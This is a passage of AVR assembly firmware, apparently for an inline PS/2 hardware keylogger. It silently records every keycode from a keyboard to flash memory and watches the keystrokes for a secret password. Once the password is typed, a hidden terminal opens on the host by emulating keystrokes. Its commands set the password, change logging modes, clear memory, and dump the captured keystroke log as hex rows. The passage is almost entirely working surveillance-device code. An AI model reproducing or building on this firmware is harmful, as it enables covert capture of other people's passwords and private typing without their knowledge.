                  breq  get_input_ok          ;
                .endif                        ;
                .ifdef KEYC_BKSLASH           ;
                  cpi   a0, KEYC_BKSLASH      ;
                  breq  get_input_ok          ;
                .endif                        ;*/

                cpi   a0, KEYC_BASE_INDEX     ;test keycode range [INPUT_BASE, INPUT_LIMIT]
                brlo  get_input_sk            ;  maybe we need some lookup-mask-tbl instead,
                cpi   a0, KEYC_LIMIT_INDEX+1  ;  if we have to support other languages
                brsh  get_input_sk            ;

get_input_ok:   ldz   input_buf               ;add keycode to input buffer
                add   zl, at                  ;
                st    z, a0                   ;
                inc   at                      ;
get_input_rs:   sts   input_buf_len, at       ;update buffer length
                sec                           ;set carry (keycode validated)
                clz                           ;clear zero (no enter-key)
                ret                           ;return

get_input_s2:   inc   at                      ;skip bytes
get_input_s1:   inc   at                      ;
get_input_su:   sts   keyc_skip_cntr, at      ;update skip counter
get_input_sk:   clc                           ;ignore this one
                ret                           ;and return

get_input_esc:  ldi   a0, KEYC_RET            ;change keycode to enter instead ESC
                clr   at                      ;clear input buffer
                sts   input_buf_len, at       ;update buffer length
get_input_entr: sec                           ;set carry (keycode validated)
                sez                           ;set zero (its the enter-key)
                ret                           ;return

get_input_bksp: dec   at                      ;remove last char from buffer, overflow?
                brmi  get_input_sk            ;  yes -> skip character
                rjmp  get_input_rs            ;  no -> update length and return successfull




;************************************************************************************************
;*
;* FUNCTION     pwd_compare
;* DESCRIPTION  compare password (pwd_buf) and input buffer (input_buf)
;* OUTPUT       sets zero flag if equal
;* WASTE        flags, at, t0, t1, z, y
;*
;************************************************************************************************
pwd_compare:    lds   at, input_buf_len       ;verify password
                lds   t0, pwd_buf_len         ;
                cp    at, t0                  ;same length?
                brne  pwd_compare_r           ;  no -> maybe next time
                ldz   pwd_buf                 ;
                ldy   input_buf               ;
pwd_compare_lp: dec   t0                      ;last keycode compared?
                brmi  pwd_compare_s           ;  yes -> return success
                ld    at, z+                  ;load next codes
                ld    t1, y+                  ;
                cp    at, t1                  ;equal?
                brne  pwd_compare_r           ;  no -> maybe next time
                breq  pwd_compare_lp          ;loop for every keycode
pwd_compare_s:  sez                           ;set zero flag
pwd_compare_r:  ret


;************************************************************************************************
;*
;* FUNCTION     pwd_get
;* DESCRIPTION  read password into input buffer (input_buf)
;* WASTE        flags, at, v0, a0, zl
;*
;************************************************************************************************
pwd_get:        ldi   zl, ee_pwd_msg          ;display pwd input message
                rcall tx_send_seq_ee          ;
                sts   input_buf_len, zero     ;clear input buffer
pwd_get_lp:     rcall ps2rx_getch             ;sleep, until some keycode arrives
                mov   a0, v0                  ;filter keycodes and update input buffer
                rcall get_input               ;
                brcc  pwd_get_lp              ;carry set? no -> loop
                breq  pwd_get_done            ;zero set? yes -> process input
                rcall tx_send_key             ;send keycode (a0)
                rjmp  pwd_get_lp              ;loop
pwd_get_done:   rjmp  tx_send_key             ;send keycode (a0) and return




;************************************************************************************************
;*
;* FUNCTION     cmd_execute
;* DESCRIPTION  search command inside input_buffer and jump to its function (if found)
;* WASTE        flags, at, t0, a0, y, z, almost anything during command execution
;*
;************************************************************************************************
cmd_execute:    lds   t0, input_buf_len       ;load input length
                tst   t0                      ;no input?
                breq  command_exit            ;  yes -> leave terminal

                ldz   command_strtbl*2        ;load command string-table
                clr   a0                      ;index counter

cmd_execute_st: lpm   t1, z+                  ;get length byte from string table
                tst   t1                      ;zero?
                breq  command_error           ;  yes -> no command found, display error
                cp    t1, t0                  ;length equal to input buffer?
                breq  cmd_execute_cp          ;  yes -> compare content
cmd_execute_sk: add   zl, t1                  ;  no -> skip t1 bytes
                adc   zh, zero                ;
                inc   a0                      ;adjust jump-table index
                rjmp  cmd_execute_st          ;try next entry

cmd_execute_cp: ldy   input_buf               ;load y with input buffer
cmd_execute_cl: dec   t1                      ;decrement counter
                brmi  cmd_execute_j2          ;negative? yes -> command found, jump to code
                lpm   at, z+                  ;load strtbl byte
                ld    t2, y+                  ;load buffer byte
                cp    at, t2                  ;equal?
                brne  cmd_execute_sk          ;  not -> skip t1 bytes
                rjmp  cmd_execute_cl          ;loop

cmd_execute_j2: ldz   command_jmptbl          ;redirect to command
                add   zl, a0                  ;
                adc   zh, zero                ;
                ijmp                          ;


;------------------------------------------------------------------------------------------------
command_exit:   mov   at, ps2tx_status        ;wait until any pending Tx is completed
                cpi   at, PS2TX_STATUS_IDLE   ;
                brne  command_exit            ;

                rcall beep_hi                 ;beep before entering slave mode
                rcall beep_lo

                pop   at                      ;return to slave mode
                pop   at                      ;
                rjmp  slave                   ;

;------------------------------------------------------------------------------------------------
command_help:   ldi   zl, ee_help_msg         ;display help message
                rjmp  tx_send_seq_ee          ;  and return

;------------------------------------------------------------------------------------------------
command_pwd:    rcall pwd_get                 ;read password

                ldx   input_buf               ;copy input_buf to pwd_buf
                ldy   pwd_buf                 ;
                lds   t0, input_buf_len       ;
                sts   pwd_buf_len, t0         ;
command_pwd_cp: dec   t0                      ;done?
                brmi  command_pwd_vf          ;  yes -> copy done, verify now
                ld    at, x+                  ;
                st    y+, at                  ;
                rjmp  command_pwd_cp          ;

command_pwd_vf: rcall pwd_get                 ;read password again
                rcall pwd_compare             ;compare passwords, equal?
                brne  command_pwd_er          ;  no -> error
                                              ;  yes -> save pwd to eeprom
                ldz   pwd_buf                 ;
                ldi   a0, ee_pwd_buf          ;
                ldi   t0, INPUT_BUF_SIZE+1    ;
command_pwd_st: ld    a1, z+                  ;
                rcall eeprom_write            ;
                inc   a0                      ;
                dec   t0                      ;
                brne  command_pwd_st          ;

                rcall read_shadow             ;verify
                rcall pwd_compare             ;
                brne  command_error           ;

command_success:ldi   zl, ee_success_msg      ;display success message
                rjmp  tx_send_seq_ee          ;  and return

command_pwd_er: rcall read_shadow             ;reload pw from eeprom
command_error:  ldi   zl, ee_error_msg        ;display error message
                rjmp  tx_send_seq_ee          ;  and return

;------------------------------------------------------------------------------------------------
command_stat:   ldi   zl, ee_status_msg       ;display status message
                rcall tx_send_seq_ee          ;
                lds   a0, error_code          ;append last error code
                rcall tx_send_num             ;
                ldi   a0, KEYC_SPACE          ;append space
                rcall tx_send_key             ;
                lds   a0, log_mode            ;append log mode
                rcall tx_send_key             ;

                ldi   zl, ee_logsize_msg      ;display logsize message
                rcall tx_send_seq_ee          ;
                mov   a0, flash_addr_c        ;output current flash address
                rcall tx_send_num             ;
                mov   a0, flash_addr_b        ;
                rcall tx_send_num             ;
                mov   a0, flash_addr_a        ;
                rjmp  tx_send_num             ;return

;------------------------------------------------------------------------------------------------
command_stp:    ldi   a1, LOGMODE_STP
                rjmp  command_setmod
;------------------------------------------------------------------------------------------------
command_log:    ldi   a1, LOGMODE_LOG
                rjmp  command_setmod
;------------------------------------------------------------------------------------------------
command_lgt:    ldi   a1, LOGMODE_LGT
                rjmp  command_setmod
;------------------------------------------------------------------------------------------------
command_lgs:    ldi   a1, LOGMODE_LGS
command_setmod: sts   log_mode, a1
                ldi   a0, ee_log_mode
                rcall eeprom_write
                rjmp  command_success

;------------------------------------------------------------------------------------------------
command_clr:    ldi   a1, ERROR_SUCCESS       ;reset status (error code)
                sts   error_code, a1          ;
                ldi   a0, ee_error_code       ;
                rcall eeprom_write            ;update eeprom
                rcall log_clear               ;clear the flash
                rjmp  command_stat            ;display status and return

;------------------------------------------------------------------------------------------------
command_qer:    ;dump from zero to flash_addr_c:b:a
                rcall delay250                ;wait 1/4 second, time to release all keys
                sts   ps2rx_buf_in, zero      ;reset ps2rx buffer
                sts   ps2rx_buf_out, zero     ;

                ;output 16 bytes per line, followed by some checksum and return
                ldx   0                       ;init our flash position
                clr   yl                      ;
command_qer_ri: clr   yh                      ;initialize checksum
                ldi   t3, 16                  ;16 bytes each row

                lds   at, ps2rx_buf_in        ;was some key pressed?
                lds   v0, ps2rx_buf_out       ;
                cp    at, v0                  ;
                breq  command_qer_rd          ;  no -> display another row
                ldi   zl, ee_abort_msg        ;  yes -> display abort message
                rjmp  tx_send_seq_ee          ;         and return

command_qer_rd: ldi   a0, KEYC_DOT            ;start each row with some dot
                rcall tx_send_key             ;

command_qer_rl: cp    yl, flash_addr_c        ;beneath end of flash?
                brlo  command_qer_c           ;  no -> continue
                cp    xh, flash_addr_b        ;
                brlo  command_qer_c           ;  no -> continue
                cp    xl, flash_addr_a        ;
                brlo  command_qer_c           ;  no -> continue
command_qer_re: neg   yh                      ;  yes -> output last checksum 
                mov   a0, yh                  ;
                rjmp  tx_send_num             ;         and return

command_qer_c:  rcall flash_read              ;read byte
                add   yh, v0                  ;add to checksum
                mov   a0, v0                  ;and dump byte
                rcall tx_send_num             ;
                adiw  xh:xl, 1                ;increment address
                adc   yl, zero                ;
                dec   t3                      ;already dumped 16 bytes?
                brne  command_qer_rl          ;  no -> continue with next byte
                                              ;  yes ->
                neg   yh                      ;         output checksum
                mov   a0, yh                  ;
                rcall tx_send_num             ;
                rcall tx_send_key_ret         ;         insert return
                rjmp  command_qer_ri          ;         continue with next row

;------------------------------------------------------------------------------------------------
command_mtst:   rcall log_clear               ;clear flash
command_mtst_b: clr   t3                      ;our error flag
command_mtst_l: mov   at, flash_addr_c        ;log char, flash full?
                cpi   at, LOW(FLASH_SIZE>>16) ;
                brlo  command_mtst_w          ;  no -> continue test
                mov   at, flash_addr_b        ;
                cpi   at, LOW(FLASH_SIZE>>8)  ;
                brlo  command_mtst_w          ;  no -> continue test
                mov   at, flash_addr_a        ;
                cpi   at, LOW(FLASH_SIZE)     ;
                brsh  command_mtst_c          ;  yes -> memory test complete

command_mtst_w: ldi   a0, 0xAA                ;write test value
                eor   a0, flash_addr_a        ;
                mov   a3, a0                  ;
                rcall log_putc                ;
                cp    a3, v0                  ;value wrote successfully?
                breq  command_mtst_s          ;  yes -> branch
                ori   t3, 1                   ;  no -> set error flag
command_mtst_s: 
                cp    flash_addr_a, zero      ;finished block bytes?
                brne  command_mtst_l          ;  no -> loop
                mov   at, flash_addr_b        ;
                andi  at, HIGH(FLASH_BLOCK_SIZE-1)
                brne  command_mtst_l          ;  no -> loop
                ldi   a0, KEYC_DOT            ;  yes -> display dot
                sbrc  t3, 0                   ;         error occured?
                ldi   a0, KEYC_E              ;         yes -> display error character instead
                rcall tx_send_key             ;
                rjmp  command_mtst_b          ;loop

command_mtst_c: rcall tx_send_key_ret         ;insert return
                rcall log_clear               ;clear flash
                rjmp  command_stat            ;display status and return






;************************************************************************************************
;*
;* MACRO        device_init
;* DESCRIPTION  initialize device
;*
;************************************************************************************************
.macro          device_init
                cli                           ;disable interrupts

                clr   zero                    ;clear zero register

                ldi   at, RAMEND              ;init stack
        				out   SPL, at

                ldi   at, DDRA_INIT           ;init port A
                out   DDRA, at
                ldi   at, PORTA_INIT
                out   PORTA, at
                ldi   at, DDRB_INIT           ;init port B
                out   DDRB, at
                ldi   at, PORTB_INIT
                out   PORTB, at
                ldi   at, DDRD_INIT           ;init port D
                out   DDRD, at
                ldi   at, PORTD_INIT
                out   PORTD, at

                out   EECR, zero              ;enable atomic eeprom writes

                                              ;init Rx logic
                ldi   at, PS2RX_STATUS_INIT   ;init ps2rx status
                sts   ps2rx_status, at        ;
                sts   ps2rx_buf_in, zero      ;init Rx buffer
                sts   ps2rx_buf_out, zero     ;
                ldi   at, PCMSK_INIT          ;set pin change mask
                out   PCMSK, at               ;
                ldi   at, GIMSK_INIT          ;
                out   GIMSK, at               ;enable pin change interrupt

                sei                           ;enable interrupts
.endm


;************************************************************************************************
;*
;* MACRO        set_slave
;* DESCRIPTION  init slave mode (i/o pins and interrupts) and direct connect PS2 I/O lines
;*
;************************************************************************************************
.macro          set_slave
                cli                           ;disable interrupts
                out   TIMSK, zero             ;disable timer0 compare A interrupt (Tx logic)

                                              ;reset vars...
                sts   ps2rx_buf_in, zero      ;reset ps2rx buffer
                sts   ps2rx_buf_out, zero     ;
                sts   keyc_skip_cntr, zero    ;reset skip cntr
                sts   log_cntr, zero          ;init logging counter

                cbi   PS2O_DDR, PS2O_CLK      ;set PS2O_CLK and PS2O_DATA to input
                cbi   PS2O_PORT, PS2O_CLK     ;and disable pullups (only listening)
                cbi   PS2O_DDR, PS2O_DATA     ;
                cbi   PS2O_PORT, PS2O_DATA    ;

                sbi   PS2CTRL_PORT, PS2CTRL   ;enable the PS2 I/O connection switch

                ldi   at, (1<<SE)             ;enable IDLE mode on sleep instruction
                out   MCUCR, at               ;

                lds   at, log_mode            ;timed logging enabled?
                cpi   at, LOGMODE_LGT         ;
                brne  set_slave_nwdt          ;  no -> keep watchdog disabled
                ldi   at, WD_INIT             ;  yes -> enable watchdog timer interrupt
                out   WDTCR, at               ;         (enables awake after idle time)
set_slave_nwdt:
                sei                           ;enable interrupts
.endm


;************************************************************************************************
;*
;* MACRO        set_master
;* DESCRIPTION  init master mode by disconnecting PS2 I/O lines, enables the terminal
;*
;************************************************************************************************
.macro          set_master
                cli                           ;disable interrupts
                out   WDTCR, zero             ;disable watchdog timer interrupt

                sbi   PS2CTRL_DDR, PS2CTRL    ;disable the PS2 I/O connection switch
                cbi   PS2CTRL_PORT, PS2CTRL   ;

                out   MCUCR, zero             ;disable sleep instruction

                                              ;reset vars...
                sts   ps2rx_buf_in, zero      ;reset ps2rx buffer
                sts   ps2rx_buf_out, zero     ;
                sts   keyc_skip_cntr, zero    ;reset skip cntr

                cbi   PS2O_DDR, PS2O_CLK      ;set PS2O_CLK and PS2O_DATA to input
                sbi   PS2O_PORT, PS2O_CLK     ;and activate pullups (high signal)
                cbi   PS2O_DDR, PS2O_DATA     ;
                sbi   PS2O_PORT, PS2O_DATA    ;

                ldi   at, PS2TX_STATUS_IDLE   ;init Tx logic (timer0, compare A)
                mov   ps2tx_status, at        ;
                ldi   at, TIMER0A             ;set compare A register value
                out   OCR0A, at               ;
                ldi   at, 2                   ;set timer0 to CTC mode
                out   TCCR0A, at              ;
                ldi   at, 1                   ;select timer0 clock source (CLKi/o)
                out   TCCR0B, at              ;
                ldi   at, (1<<OCIE0A)         ;enable timer0 compare A interrupt
                out   TIMSK, at               ;

                sei                           ;enable interrupts
.endm




;************************************************************************************************
;*
;* INIT
;*
;************************************************************************************************
INIT:    				device_init                   ;init device ports

               ;selftest                      ;perform selftest and verify checksum

                dbg_init                      ;init optional debug support

                flash_init                    ;init the flash device

               ;sbis  JMP1_PIN, JMP1          ;JMP1 set?
               ;rjmp  master                  ;  yes -> directly enter terminal mode

                rcall read_shadow             ;load eeprom data into shadow memory
                dbg_dump EE_DATA_SIZE, shadow_start

                lds   at, log_mode            ;logging enabled?
                cpi   at, LOGMODE_STP         ;
                breq  slave                   ;  no -> skip
                ldi   a0, LOGID_RESTART       ;  yes -> write restart id to flash
                rcall log_putc                ;

;------------------------------------------------------------------------------------------------
slave:          ;slave mode: if logging turned on, then write the Rx buffer to flash
                ;in all cases, parse the Rx buffer for the user-defined password sequence
                ;if found, turn device into master mode
;------------------------------------------------------------------------------------------------
                set_slave                     ;init slave mode

slave_ci:       sts   input_buf_len, zero     ;clear input buffer
slave_lp:       sbis  JMP1_PIN, JMP1          ;JMP1 set?
                rjmp  master                  ;  yes -> directly enter terminal mode (no flush!)

                rcall ps2rx_getch             ;sleep, until some keycode arrives
                push  v0                      ;store keycode value

                mov   a0, v0                  ;write keycode value to flash
                rcall log_key                 ;

                pop   a0                      ;restore keycode value
                rcall get_input               ;filter keycodes and update input buffer
                brcc  slave_lp                ;carry set? no -> loop
                brne  slave_lp                ;zero set? no -> loop

                                              ;return was pressed, process input

                dbg_dump INPUT_BUF_SIZE+1, input_buf

                rcall pwd_compare             ;compare password, equal?
                brne  slave_ci                ;  no -> clear input buffer and loop


master_flush:  .ifdef FLASH_FLUSH
                rcall log_putc_flush          ;perform a flash flush
               .endif

;------------------------------------------------------------------------------------------------
master:         ;master/terminal mode: parse the input buffer for commands and execute them
;------------------------------------------------------------------------------------------------
                rcall beep_lo                 ;beep before entering master mode
                rcall beep_hi

                rcall delay250                ;wait 1/4 second, time to release all keys

                set_master                    ;init master mode

                rcall read_shadow             ;load eeprom data into shadow memory
                ldi   zl, ee_init_msg         ;send terminal init message
                rcall tx_send_seq_ee          ;
                rcall command_stat            ;display status

master_ci:      rcall tx_send_key_ret         ;insert return
                ldi   a0, KEYC_SHIFT          ;display command prompt
                rcall tx_send                 ;
                ldi   a0, KEYC_4              ;
                rcall tx_send_key             ;
                ldi   a0, KEYC_SHIFT          ;
                rcall tx_send_key             ;

                sts   input_buf_len, zero     ;clear input buffer

master_lp:      rcall ps2rx_getch             ;sleep, until some keycode arrives
                mov   a0, v0                  ;filter keycodes and update input buffer
                rcall get_input               ;
                brcc  master_lp               ;carry set? no -> loop
                breq  master_inp              ;zero set? yes -> process input
                rcall tx_send_key             ;send keycode (a0)
                rjmp  master_lp               ;loop

master_inp:     rcall tx_send_key             ;send keycode (a0)
                                              ;return was pressed, process input

                dbg_dump INPUT_BUF_SIZE+1, input_buf

                rcall cmd_execute             ;execute command inside input_buffer
                rjmp  master_ci               ;clear input buffer and loop




;************************************************************************************************
;*
;* INCLUDE CONSTANT DATA
;*
;************************************************************************************************
.include "cdata.inc"




;************************************************************************************************
;*
;* END OF FILE
;*
;************************************************************************************************
